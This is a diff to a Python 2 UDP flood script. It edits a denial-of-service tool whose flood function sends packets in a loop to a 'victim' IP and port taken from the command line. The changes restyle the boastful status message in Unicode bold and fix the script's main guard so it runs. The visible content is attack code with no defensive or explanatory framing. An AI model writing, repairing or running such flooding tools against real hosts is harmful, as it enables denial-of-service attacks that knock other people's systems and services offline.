@@ -19,7 +19,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print " XGT TIDAK JAHATT!!  %s MELUNCUR %s PORT %s "%(sent, victim, vport)
+        print " 𝗫𝘂𝗵𝗶𝗴𝗵!!  %s 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺  %s 𝗜𝗽 %s 𝗣𝗼𝗿𝘁 "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
@@ -28,5 +28,5 @@ def main():
     else:
         flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
 
-if name == 'main':
+if __name__ == '__main__':
     main()
